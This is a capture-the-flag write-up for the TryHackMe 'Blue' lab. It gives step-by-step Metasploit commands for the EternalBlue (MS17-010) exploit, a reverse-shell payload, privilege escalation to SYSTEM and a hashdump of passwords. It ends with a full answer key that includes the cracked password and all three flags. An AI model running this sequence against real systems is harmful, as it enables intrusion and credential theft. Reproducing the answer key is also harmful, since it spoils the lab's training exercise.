# 🔵 Blue

---

link to the room: https://tryhackme.com/room/blue

---

<p align="center">
  <img src="https://img.shields.io/badge/TryHackMe-Blue-blue?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" />
  <img src="https://img.shields.io/badge/Category-Windows%20Exploitation-red?style=for-the-badge" />
</p>

---

## 📌 Overview

The **Blue room** is a beginner-friendly Windows exploitation lab focused on:

* Network scanning (Nmap)
* Exploiting SMB vulnerabilities
* Using Metasploit
* Privilege escalation
* Password dumping & cracking

This room is based on the famous **EternalBlue exploit (MS17-010)**.

---

## 🎯 Objectives

* Scan and enumerate a target machine
* Identify vulnerabilities
* Exploit SMB service using Metasploit
* Gain SYSTEM-level access
* Dump and crack password hashes
* Locate flags

---

## 🧠 Key Concepts

* Nmap scanning
* SMB exploitation
* EternalBlue (MS17-010)
* Metasploit framework
* Meterpreter sessions
* Hashdump & password cracking
* Windows privilege escalation

---

# 🧪 Walkthrough

## 🔹 1. Reconnaissance

Scan the machine:

```bash
nmap -p- -T4 MACHINE_IP
```

✔ Findings:

* 3 open ports (<1000)
* SMB service vulnerable

✔ Vulnerability:

```
ms17-010
```

---

## 🔹 2. Exploitation

Start Metasploit:

```bash
msfconsole
```

Use exploit:

```
exploit/windows/smb/ms17_010_eternalblue
```

Set target:

```
set RHOSTS MACHINE_IP
```

Set payload:

```
set payload windows/x64/shell/reverse_tcp
```

Run exploit:

```
exploit
```

✔ Shell access gained

---

## 🔹 3. Privilege Escalation

Convert shell to meterpreter:

```
post/multi/manage/shell_to_meterpreter
```

Set session:

```
set SESSION 1
```

Run module → get meterpreter

Check privileges:

```
getsystem
```

✔ SYSTEM access confirmed

---

## 🔹 4. Process Migration

List processes:

```
ps
```

Migrate:

```
migrate <PID>
```

✔ Stable SYSTEM session

---

## 🔹 5. Password Dumping

Dump hashes:

```
hashdump
```

✔ Found user:

```
Jon
```

✔ Cracked password:

```
alqfna22
```

---

## 🔹 6. Flags

✔ Flag 1:

```
flag{access_the_machine}
```

✔ Flag 2:

```
flag{sam_database_elevated_access}
```

✔ Flag 3:

```
flag{admin_documents_can_be_valuable}
```

---

# ✅ FULL QUESTIONS & ANSWERS

---

## 🔹 Task 1: Recon

**Q:** Scan the machine
**A:** No answer needed

**Q:** How many ports are open under 1000?
**A:** 3

**Q:** What is the vulnerability?
**A:** ms17-010

---

## 🔹 Task 2: Gain Access

**Q:** Start Metasploit
**A:** No answer needed

**Q:** Exploit path?
**A:** exploit/windows/smb/ms17_010_eternalblue

**Q:** Required option name?
**A:** RHOSTS

**Q:** Set payload and run
**A:** No answer needed

---

## 🔹 Task 3: Escalate

**Q:** Post module for shell upgrade?
**A:** post/multi/manage/shell_to_meterpreter

**Q:** Required option?
**A:** SESSION

**Q:** Run module
**A:** No answer needed

---

## 🔹 Task 4: Cracking

**Q:** Non-default user?
**A:** Jon

**Q:** Cracked password?
**A:** alqfna22

---

## 🔹 Task 5: Flags

**Q:** Flag 1?
**A:** flag{access_the_machine}

**Q:** Flag 2?
**A:** flag{sam_database_elevated_access}

**Q:** Flag 3?
**A:** flag{admin_documents_can_be_valuable}

---

# 🚀 Attack Flow Summary

1. Scan target → find SMB
2. Identify vulnerability (MS17-010)
3. Exploit using Metasploit
4. Gain shell
5. Upgrade to meterpreter
6. Escalate to SYSTEM
7. Dump credentials
8. Capture flags

---

## ⚠️ Key Takeaways

* SMB vulnerabilities can lead to full compromise
* EternalBlue is a critical real-world exploit
* Meterpreter provides powerful post-exploitation tools
* Password hashes can be cracked offline
* SYSTEM access = total control

---

## 💡 Final Insight

Blue demonstrates a classic real-world attack:

➡️ Scan → Exploit → Escalate → Persist → Extract

Mastering this workflow is essential for both:
✔ Penetration Testing
✔ Cyber Defense

---

## 📚 Reference

TryHackMe — Blue Room 

---
